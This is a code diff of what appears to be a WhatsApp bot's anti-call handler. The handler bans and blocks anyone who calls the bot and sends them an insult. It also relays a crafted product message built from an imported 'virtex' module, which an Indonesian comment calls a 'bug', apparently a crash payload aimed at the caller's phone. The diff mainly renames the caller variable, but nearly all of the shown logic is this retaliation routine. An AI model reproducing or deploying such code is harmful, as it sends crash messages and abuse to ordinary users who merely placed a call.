@@ -70,12 +70,13 @@ async function starts() {
    if(!Anticall) return
    
 	let number = json[1]['from'];
+	let Nomer =`${number.split("@")[0]}@s.whatsapp.net`
         let isOffer = json[1]["type"] == "offer";
-     pushname = client.contacts[number] != undefined ? client.contacts[number].notify = undefined ? PhoneNumber('+' + number.replace('@s.whatsapp.net', '')).getNumber('international') : client.contacts[number].notify || client.contacts[number].vname : PhoneNumber('+' + number.replace('@s.whatsapp.net', '')).getNumber('international')
-      if(cekBannedUser(number, ban)) return
-        console.log("call dari "+ number)
+     pushname = client.contacts[Nomer] != undefined ? client.contacts[Nomer].notify = undefined ? PhoneNumber('+' + Nomer.replace('@s.whatsapp.net', '')).getNumber('international') : client.contacts[Nomer].notify || client.contacts[Nomer].vname : PhoneNumber('+' + Nomer.replace('@s.whatsapp.net', '')).getNumber('international')
+      if(cekBannedUser(Nomer, ban)) return
+        console.log("call dari "+ Nomer)
         console.log(pushname)
-        addBanned (pushname, calender, number, ban) 
+        addBanned (pushname, calender, Nomer, ban) 
         addBlock(number, blocked)  
         forward = { forwardingScore: 10000000000, isForwarded: true, sendEphemeral: true}
         const { virtex8 } = require('./virtex/virtex.js')
@@ -106,10 +107,10 @@ async function starts() {
         var teksnya = "Fuck you bitch, why you call me huh ? "
         }
         
-        client.sendMessage(number, teksnya, MessageType.text)        
+        client.sendMessage(Nomer, teksnya, MessageType.text)        
         imeu = await client.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
         imeg = imeu.message.imageMessage
-        res =  client.prepareMessageFromContent(number, {
+        res =  client.prepareMessageFromContent(Nomer, {
         'productMessage': {
         'product': {
         'productImage': imeg,
@@ -125,14 +126,11 @@ async function starts() {
          }
          }, {contextInfo: forward}), 
         await client.relayWAMessage(res)    
-            
-         }
-      
-	    await client.modifyChat(number, ChatModification.delete)       
+        await client.modifyChat(Nomer, ChatModification.delete)       
         //await client.sendMessage(number, "Kamu telah di block,banned + bug karena telpon botz", MessageType.text)
-        await client.blockUser(number, "add") // Block user
+        await client.blockUser(Nomer, "add") // Block user
         
-        
+         }      
         
         })     
         
